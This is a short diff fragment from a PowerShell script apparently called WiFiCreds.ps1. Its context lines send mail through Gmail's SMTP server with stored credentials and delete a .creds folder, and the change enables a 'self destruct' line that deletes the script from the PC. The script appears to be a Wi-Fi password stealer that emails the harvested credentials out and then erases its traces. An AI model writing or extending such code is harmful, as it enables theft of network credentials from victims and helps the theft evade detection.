@@ -20,4 +20,4 @@ Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl 
 del -r .creds
 
 #Self Destruct Script from pc
-#Remove-Item WiFiCreds.ps1 -Force 
+Remove-Item WiFiCreds.ps1 -Force 
